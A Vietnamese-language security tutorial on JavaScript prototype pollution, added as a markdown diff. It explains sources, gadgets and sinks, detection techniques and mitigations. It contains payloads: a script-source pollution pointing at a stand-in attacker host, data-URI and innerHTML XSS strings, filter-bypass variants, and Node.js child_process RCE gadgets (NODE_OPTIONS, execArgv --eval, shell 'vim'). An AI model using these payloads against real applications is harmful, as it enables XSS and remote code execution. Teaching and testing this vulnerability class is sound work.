@@ -1,0 +1,335 @@
+---
+title: "Prototype Pollution: Khai Thác Chuỗi Nguyên Mẫu JavaScript"
+description: "Phân tích toàn diện lỗ hổng Prototype Pollution — từ cơ chế kế thừa nguyên mẫu JavaScript, các vector tấn công Client-side và Server-side, kỹ thuật bypass bộ lọc, đến RCE qua child_process và cách phòng ngừa bằng Object.create(null), Map/Set, Object.freeze."
+date: "2026-04-25"
+category: "vulnerability"
+tags: ["prototype-pollution", "javascript", "xss", "rce", "node.js", "owasp"]
+thumbnail: ""
+external_link: ""
+---
+
+## 1. Tổng quan nhanh
+
+Prototype Pollution là một lỗ hổng nghiêm trọng trong JavaScript, cho phép kẻ tấn công thêm các thuộc tính tùy ý vào các đối tượng nguyên mẫu toàn cục của ngôn ngữ này. Vì JavaScript sử dụng cơ chế kế thừa nguyên mẫu, mọi đối tượng do người dùng định nghĩa sau đó sẽ tự động kế thừa các thuộc tính độc hại này.
+
+Mặc dù bản thân việc tiêm thuộc tính thường không gây ra tác động ngay lập tức, nhưng nếu ứng dụng xử lý các thuộc tính bị kiểm soát này một cách thiếu an toàn, lỗ hổng có thể được kết nối chuỗi (chaining) để gây ra hậu quả tàn khốc. Trên môi trường trình duyệt, nó thường dẫn đến tấn công DOM XSS. Đặc biệt, trong môi trường máy chủ như Node.js, lỗ hổng này có thể dẫn đến leo thang đặc quyền hoặc Thực thi mã từ xa (RCE) với mức độ rủi ro cực kỳ nghiêm trọng.
+
+![Minh họa nguyên lý Prototype Pollution](/images/vulnerabilities/prototype-pollution/image1.png)
+
+<Alert type="warning">
+**Cảnh báo Đạo đức:** Các thông tin và kỹ thuật trong bài viết này chỉ nhằm mục đích cung cấp kiến thức bảo mật, phục vụ cho việc nghiên cứu và kiểm thử trên các hệ thống đã được cấp phép. Tuyệt đối không sử dụng cho các mục đích vi phạm pháp luật, đặc biệt trên môi trường Server-side vì có rủi ro cao gây ra tình trạng Từ chối dịch vụ (DoS).
+</Alert>
+
+---
+
+## 2. Lỗ hổng hoạt động như thế nào?
+
+### 2.1. Căn bản về JavaScript Prototypes và Tính kế thừa
+
+Không giống như các ngôn ngữ lập trình hướng đối tượng dựa trên lớp truyền thống, JavaScript sử dụng mô hình kế thừa dựa trên nguyên mẫu (prototypal inheritance). Trong JavaScript, một đối tượng về cơ bản là một tập hợp các cặp khóa:giá trị được gọi là "thuộc tính". Thuộc tính chứa dữ liệu hoặc các phương thức.
+
+![Cấu trúc đối tượng JavaScript](/images/vulnerabilities/prototype-pollution/image2.png)
+
+```javascript
+const user = {
+    username: "wiener",
+    userId: 01234,
+    exampleMethod: function(){ /* thực thi hành động */ }
+}
+// Truy cập qua dấu chấm hoặc ngoặc vuông
+user.username;    // "wiener"
+user['userId'];   // 01234
+```
+
+Mọi đối tượng trong JavaScript đều được liên kết ẩn với một đối tượng khác gọi là nguyên mẫu (prototype). Trình duyệt tự động gán các nguyên mẫu tích hợp sẵn cho các kiểu dữ liệu tương ứng.
+
+```javascript
+Object.getPrototypeOf("");  // String.prototype
+Object.getPrototypeOf([]);  // Array.prototype
+Object.getPrototypeOf(1);   // Number.prototype
+```
+
+![Chuỗi nguyên mẫu JavaScript](/images/vulnerabilities/prototype-pollution/image3.png)
+
+Mọi chuỗi nguyên mẫu này cuối cùng đều trỏ về `Object.prototype`, và nguyên mẫu của `Object.prototype` là `null`. Mọi đối tượng đều có một thuộc tính đặc biệt tên là `__proto__` (hoạt động như một getter/setter) cho phép truy cập hoặc thiết lập trực tiếp nguyên mẫu của nó:
+
+```javascript
+username.__proto__                        // String.prototype
+username.__proto__.__proto__              // Object.prototype
+username.__proto__.__proto__.__proto__    // null
+```
+
+Nhờ cơ chế này, đối tượng tự động kế thừa các thuộc tính và phương thức từ nguyên mẫu của nó. Trong quá khứ, các nhà phát triển thường lợi dụng đặc tính này để thêm các phương thức tùy chỉnh. Ví dụ, trước khi JavaScript có hàm `trim()`, lập trình viên thường tự thêm nó:
+
+```javascript
+String.prototype.removeWhitespace = function(){
+    // logic xóa khoảng trắng
+}
+let searchTerm = "  example ";
+searchTerm.removeWhitespace(); // Kết quả: "example"
+```
+
+### 2.2. Lỗ hổng phát sinh như thế nào?
+
+Lỗ hổng Prototype Pollution thường xảy ra khi một hàm JavaScript thực hiện gộp đệ quy một đối tượng chứa dữ liệu do người dùng kiểm soát vào một đối tượng hiện có mà không làm sạch các khóa. Để khai thác thành công, cần ba thành phần cốt lõi: **Nguồn đầu vào (Source)**, **Công cụ khai thác (Gadget)**, và **Điểm thực thi (Sink)**.
+
+- **Nguồn đầu vào (Source):** Dữ liệu thường đến từ tham số URL, Hash fragment, thông điệp Web hoặc chuỗi JSON.
+
+  - **Qua URL:** Khi phân tích cú pháp truy vấn `?__proto__[evilProperty]=payload`, một bộ phân tích URL có thể hiểu nhầm và tạo ra đối tượng như sau:
+
+```javascript
+{
+    existingProperty1: 'foo',
+    existingProperty2: 'bar',
+    __proto__: {
+        evilProperty: 'payload'
+    }
+}
+```
+
+Tại một thời điểm nào đó, thao tác gộp đệ quy sẽ thực thi lệnh tương đương: `targetObject.__proto__.evilProperty = 'payload';`
+
+  - **Qua JSON:** Phương thức `JSON.parse()` coi mọi khóa trong đối tượng JSON là chuỗi thông thường, bao gồm cả `__proto__`.
+
+```javascript
+const objectLiteral = {__proto__: {evilProperty: 'payload'}};
+const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
+
+console.log(objectLiteral.hasOwnProperty('__proto__'));  // false
+console.log(objectFromJson.hasOwnProperty('__proto__')); // true
+```
+
+Khi đối tượng từ `JSON.parse()` này được gộp đệ quy, thuộc tính `evilProperty` sẽ bị đẩy thẳng vào `Object.prototype`.
+
+- **Ví dụ về Công cụ khai thác (Gadget) và Điểm thực thi (Sink):** Một Gadget là bất kỳ thuộc tính nào được ứng dụng xử lý thiếu an toàn và có thể bị kế thừa từ nguyên mẫu. Xét đoạn mã cấu hình thư viện sau:
+
+```javascript
+let transport_url = config.transport_url || defaults.transport_url;
+let script = document.createElement('script');
+script.src = `${transport_url}/example.js`;
+document.body.appendChild(script);
+```
+
+Nếu nhà phát triển chưa thiết lập `transport_url` trong đối tượng `config`, ứng dụng sẽ tìm kiếm nó trên chuỗi nguyên mẫu. Kẻ tấn công có thể làm ô nhiễm nguyên mẫu toàn cục bằng tham số truy vấn:
+
+```
+?__proto__[transport_url]=//evil-user.net
+```
+
+Hoặc gắn trực tiếp payload XSS sử dụng Data URI:
+
+```
+?__proto__[transport_url]=data:,alert(1);//
+```
+
+Kết quả là mã độc sẽ được nhúng thẳng vào thuộc tính `src` (Sink) của thẻ script và thực thi ngay lập tức (dấu `//` dùng để vô hiệu hóa đoạn `/example.js` phía sau).
+
+---
+
+## 3. Các biến thể và Phân loại
+
+Môi trường thực thi của JavaScript quyết định tính chất và hậu quả của lỗ hổng:
+
+- **Client-side Prototype Pollution:** Xảy ra trực tiếp trên trình duyệt của người dùng. Kẻ tấn công thường thao túng các tham số URL hoặc thông điệp Web để làm ô nhiễm nguyên mẫu. Mục tiêu chính là kích hoạt các lỗ hổng DOM XSS bằng cách kiểm soát các thuộc tính mà nhà phát triển lầm tưởng là người dùng không thể can thiệp.
+
+- **Server-side Prototype Pollution:** Xảy ra trên các nền tảng máy chủ sử dụng JavaScript như Node.js. Loại này nguy hiểm hơn gấp nhiều lần nhưng khó phát hiện hơn. Vì JavaScript trên máy chủ xử lý dữ liệu chung cho toàn bộ tiến trình (Node process), một thao tác làm ô nhiễm nguyên mẫu sẽ tồn tại dai dẳng cho đến khi dịch vụ được khởi động lại. Hậu quả có thể dẫn đến thay đổi logic ứng dụng, leo thang đặc quyền hoặc thực thi lệnh hệ thống (RCE).
+
+---
+
+## 4. Hướng dẫn khai thác thực tế
+
+### 4.1. Khai thác Client-side Prototype Pollution
+
+Cách phổ biến nhất để khai thác là sử dụng chuỗi `__proto__`. Nếu nhà phát triển sử dụng cơ chế lọc danh sách đen, kẻ tấn công có thể sử dụng các kỹ thuật vượt rào:
+
+- **Khai thác qua hàm khởi tạo (Constructor):** Trừ khi nguyên mẫu được gán là `null`, mọi đối tượng đều có thuộc tính `constructor` trỏ về hàm tạo ra nó (cho dù được tạo bằng ngoặc nhọn hay hàm `new Object()`).
+
+```javascript
+let myObjectLiteral = {};
+let myObject = new Object();
+console.log(myObjectLiteral.constructor); // function Object(){...}
+```
+
+Hàm Constructor này lại có thuộc tính `prototype`. Do đó, `myObject.constructor.prototype` hoàn toàn tương đương với `myObject.__proto__`. Payload vượt lọc: `?constructor[prototype][evilProperty]=payload`.
+
+- **Vượt qua bộ lọc không đệ quy:** Nếu bộ lọc chỉ xóa chuỗi `__proto__` một lần duy nhất, việc sử dụng kỹ thuật chèn lồng nhau như `?__pro__proto__to__.gadget=payload` sẽ tự động nối lại thành một tải trọng hợp lệ là `__proto__.gadget` sau khi đi qua bộ lọc.
+
+- **Lạm dụng Browser APIs (fetch và Object.defineProperty):**
+
+  - **Hàm fetch():** Hàm này chấp nhận đối tượng tùy chọn để cấu hình request (như phương thức, headers, body...).
+
+```javascript
+fetch('https://normal-website.com/my-account/change-email', {
+    method: 'POST',
+    body: 'user=carlos&email=carlos%40ginandjuice.shop'
+})
+```
+
+Xét đoạn mã xử lý JSON thiếu an toàn sau:
+
+```javascript
+fetch('/my-products.json',{method:"GET"})
+    .then((response) => response.json())
+    .then((data) => {
+        let username = data['x-username']; // Đọc từ JSON header
+        let message = document.querySelector('.message');
+        if(username) {
+            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
+        }
+    });
+```
+
+Kẻ tấn công có thể làm ô nhiễm thuộc tính `headers` của `fetch()` (do thuộc tính này chưa được định nghĩa trong tùy chọn): `?__proto__[headers][x-username]=<img/src/onerror=alert(1)>`. Hàm fetch sẽ tự động mang header độc hại này gửi lên máy chủ, máy chủ trả về qua file JSON, và gán vào biến `username`, dẫn tới DOM XSS qua thuộc tính `innerHTML`.
+
+  - **Hàm Object.defineProperty():** Thường được nhà phát triển dùng để ngăn chặn Prototype Pollution bằng cách cấu hình thuộc tính không cho phép ghi đè.
+
+```javascript
+Object.defineProperty(vulnerableObject, 'gadgetProperty', {
+    configurable: false,
+    writable: false
+})
+```
+
+Tuy nhiên, nếu họ quên thiết lập giá trị ban đầu (thiếu thuộc tính `value` trong đối tượng descriptor), kẻ tấn công có thể làm ô nhiễm chính thuộc tính `value` này trên nguyên mẫu để tiêm dữ liệu độc hại qua mặt hàng rào phòng thủ.
+
+### 4.2. Khai thác Server-side Prototype Pollution
+
+Mục tiêu trên máy chủ thường là Thực thi mã từ xa (RCE) thông qua mô-đun `child_process`. Do tính chất bất đồng bộ của Node.js, việc đầu tiên là phải nhận diện được tiến trình nào đang bị lỗ hổng.
+
+- **Nhận diện yêu cầu có thể khai thác:** Bằng cách làm ô nhiễm thuộc tính môi trường `NODE_OPTIONS`, kẻ tấn công có thể chèn cờ `--inspect` trỏ về máy chủ do họ kiểm soát (ví dụ: Burp Collaborator). Mỗi khi một tiến trình Node mới được tạo ra, nó sẽ gửi tín hiệu ping về máy chủ Collaborator: `"NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com"`
+
+- **Sử dụng child_process.fork():** Hàm này có tùy chọn `execArgv` (các tham số dòng lệnh truyền cho tiến trình). Kẻ tấn công có thể làm ô nhiễm mảng này để truyền đối số `--eval`, cho phép thực thi mã JavaScript tùy ý, thậm chí là tải thêm module: `"execArgv": [ "--eval=require('<module>')" ]`
+
+- **Sử dụng child_process.execSync():** Hàm này thực thi lệnh hệ thống. Bằng cách làm ô nhiễm đồng thời thuộc tính `shell` và `input` (dữ liệu truyền vào luồng stdin), kẻ tấn công có thể ghi đè lệnh gốc. Tuy nhiên, cờ `-c` mặc định của Node sẽ chặn việc biến chính Node thành shell, do đó tin tặc thường ép ứng dụng gọi các công cụ chỉnh sửa văn bản như `vim` hoặc `ex` làm shell trung gian:
+
+```json
+"shell": "vim",
+"input": ":! <command>\n"
+```
+
+<Alert type="tip">
+*Lưu ý: Vim có dấu nhắc tương tác và yêu cầu phím Enter, do đó payload bắt buộc phải có ký tự xuống dòng `\n`.* Nếu cần sử dụng các lệnh không đọc luồng stdin, kẻ tấn công có thể dùng công cụ `xargs` hoặc tính năng `curl -d @-` để chuyển đổi luồng dữ liệu.
+</Alert>
+
+---
+
+## 5. Checklist Kiểm thử và Nhận diện
+
+### 5.1. Phát hiện lỗ hổng trên Client-side
+
+- **Tìm kiếm Source thủ công:** Thử chèn tải trọng qua URL bằng cả hai định dạng dấu ngoặc vuông và dấu chấm (ví dụ: `?__proto__[foo]=bar` hoặc `?__proto__.foo=bar`). Sau đó, kiểm tra biến `Object.prototype.foo` trên Browser Console.
+
+- **Tìm kiếm Gadget thủ công:** Khi đã có Source, bạn có thể tiêm một đoạn mã bẫy lỗi vào nguyên mẫu ngay trong Console để theo dõi xem thuộc tính nào đang được ứng dụng gọi ra:
+
+```javascript
+Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
+    get() {
+        console.trace();
+        return 'polluted';
+    }
+});
+```
+
+Trình duyệt sẽ in ra một Stack Trace (dấu vết ngăn xếp) mỗi khi thuộc tính này được truy cập, giúp bạn lần ngược mã nguồn đến tận điểm thực thi (Sink).
+
+- **Tự động hóa:** Nên sử dụng công cụ **DOM Invader** (tích hợp trong trình duyệt Burp Suite) để tự động quét cả Source và Gadget.
+
+### 5.2. Phát hiện lỗ hổng trên Server-side
+
+Kiểm thử Server-side khó khăn hơn do 4 nguyên nhân: Không có mã nguồn, Thiếu công cụ kiểm tra thời gian thực, Rủi ro DoS, và sự tồn tại dai dẳng của thuộc tính ô nhiễm. Tuy nhiên, có các kỹ thuật nhận diện sau:
+
+- **Nhận diện qua phản hồi (Reflection):** Vòng lặp `for...in` mặc định sẽ lặp qua cả các thuộc tính được kế thừa trên đối tượng hoặc mảng.
+
+```javascript
+const myObject = { a: 1, b: 2 };
+Object.prototype.foo = 'bar';
+myObject.hasOwnProperty('foo'); // false
+
+for(const propertyKey in myObject){
+    console.log(propertyKey);
+} // Kết quả: a, b, foo
+```
+
+Nếu ứng dụng nhận dữ liệu JSON qua yêu cầu POST hoặc PUT và trả về một bản ghi phản chiếu:
+
+```http
+POST /user/update HTTP/1.1
+...
+{
+    "user":"wiener",
+    "__proto__":{
+        "foo":"bar"
+    }
+}
+```
+
+Nếu HTTP Response trả về có chứa trường `"foo":"bar"`, lỗ hổng đã được xác nhận.
+
+- **Nhận diện ẩn:**
+
+  - **Ghi đè mã trạng thái:** Rất phổ biến trường hợp ứng dụng trả về HTTP 200 OK nhưng body chứa thông tin mã lỗi khác. Mô-đun `http-errors` của Node.js thiết lập mã lỗi động qua hàm `createError()`. Bằng cách làm ô nhiễm thuộc tính `status` với một mã lỗi lạ (nằm trong khoảng **400-599**), việc trang báo lỗi thay đổi mã HTTP là minh chứng của lỗ hổng. (Node.js mặc định trả về lỗi 500 nếu mã nằm ngoài khoảng này).
+
+  - **Ghi đè khoảng trắng JSON:** Làm ô nhiễm thuộc tính `json spaces` của Express có thể khiến các phản hồi JSON thay đổi định dạng thụt lề (cần xem ở tab Raw của Burp).
+
+  - **Ghi đè Charset:** Khai thác lỗi lấy dữ liệu trong hàm `getCharset(req)` của Express. Khi thuộc tính `charset` trả về `undefined`, ứng dụng có thể lấy giá trị từ prototype. Làm ô nhiễm thuộc tính `content-type` thành `application/json; charset=utf-7`, ứng dụng sẽ ép dùng UTF-7 và tự động giải mã các chuỗi mã hóa UTF-7 (ví dụ `+AGYAbwBv-` thành `"foo"`), xác nhận lỗ hổng.
+
+- **Công cụ quét tự động:** Cài đặt Extension **Server-Side Prototype Pollution Scanner** từ BApp Store của Burp Suite để tự động hóa toàn bộ quy trình nhận diện.
+
+---
+
+## 6. Cách phòng ngừa và Khắc phục
+
+### 6.1. Ngăn chặn Object kế thừa thuộc tính (Giải pháp cốt lõi)
+
+Khởi tạo đối tượng bằng phương thức `Object.create(null)` thay vì dùng ngoặc nhọn `{}`. Đối tượng được tạo ra sẽ có nguyên mẫu là `null`, đảm bảo miễn nhiễm tuyệt đối với mọi cuộc tấn công mượn đường nguyên mẫu.
+
+```javascript
+let myObject = Object.create(null);
+Object.getPrototypeOf(myObject); // null
+```
+
+### 6.2. Sử dụng các cấu trúc dữ liệu an toàn thay thế
+
+Sử dụng cấu trúc `Map` (cho cặp khóa-giá trị) hoặc `Set` (cho dữ liệu đơn lẻ) thay vì đối tượng thông thường. Các phương thức `.get()` hoặc `.has()` chỉ truy xuất các thuộc tính được định nghĩa trực tiếp, hoàn toàn bỏ qua chuỗi nguyên mẫu.
+
+*Ví dụ với Map:*
+
+```javascript
+Object.prototype.evil = 'polluted';
+let options = new Map();
+options.set('transport_url', 'https://normal-website.com');
+
+options.evil;                    // 'polluted'
+options.get('evil');             // undefined (Bảo vệ thành công)
+options.get('transport_url');    // 'https://normal-website.com'
+```
+
+*Ví dụ với Set:*
+
+```javascript
+Object.prototype.evil = 'polluted';
+let options = new Set();
+options.add('safe');
+
+options.evil;           // 'polluted';
+options.has('evil');    // false (Bảo vệ thành công)
+options.has('safe');    // true
+```
+
+### 6.3. Ngăn chặn thay đổi Prototype Objects
+
+Sử dụng hàm `Object.freeze(Object.prototype)` ngay tại thời điểm khởi chạy ứng dụng để khóa chặt đối tượng nguyên mẫu, không cho phép sửa thuộc tính. (Phương án thay thế là `Object.seal()` nếu cần giữ lại giá trị cũ).
+
+### 6.4. Làm sạch các khóa thuộc tính
+
+Nếu buộc phải gộp đệ quy, hãy dùng danh sách cho phép. Nếu dùng danh sách chặn, phải đảm bảo lọc bỏ hoàn toàn cả hai khóa `__proto__` và `constructor` một cách đệ quy.
+
+<Alert type="important">
+*Trên môi trường Node.js, quản trị hệ thống có thể sử dụng cờ `--disable-proto=delete` hoặc `--disable-proto=throw` để vô hiệu hóa hoàn toàn thuộc tính `__proto__`, tuy nhiên điều này vẫn có thể bị vượt qua nếu tin tặc tấn công qua hàm `constructor`.*
+</Alert>
+
+## Tham khảo
+
+- [PortSwigger — Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
+- [HackTricks — Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
+- [MDN — Object.prototype](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype)
